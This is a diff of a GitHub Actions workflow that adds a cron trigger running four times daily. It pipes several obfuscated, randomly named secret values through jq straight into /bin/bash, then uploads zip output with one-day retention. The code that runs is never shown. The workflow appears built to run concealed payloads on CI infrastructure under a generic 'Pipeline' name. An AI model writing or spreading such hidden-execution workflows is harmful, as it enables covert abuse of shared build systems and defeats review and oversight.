@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '29 4,10,16,22 * * *'
 env:
   CI: true
 concurrency:
@@ -17,17 +19,16 @@ jobs:
           fetch-depth: 1
       - name: Launch
         env:
-          lm6202: ${{ secrets.lm6202 }}
+          i6053: ${{ secrets.i6053 }}
         run: |
-          printf '%s' "$lm6202" | jq -r .f5 | /bin/bash
-          echo $xjpt25 | jq -r .gdn14 | /bin/bash
-          printf '%s' "$qw81" | jq -r .hlqif00534 | /bin/bash
-          printf '%s' "$q58" | jq -r .gdxyj03 | /bin/bash
-          echo $q1838 | jq -r .fo98 | /bin/bash
+          printf '%s' "$i6053" | jq -r .mfzz0313 | /bin/bash
+          printf '%s' "$w7" | jq -r .dsbyr8 | /bin/bash
+          echo $rr84899 | jq -r .bo377 | /bin/bash
+          printf '%s' "$ceiia78295" | jq -r .dt229 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
         with:
-          name: 2vX6pVmC
+          name: 91cgLxZF
           path: "*.zip"
           retention-days: 1
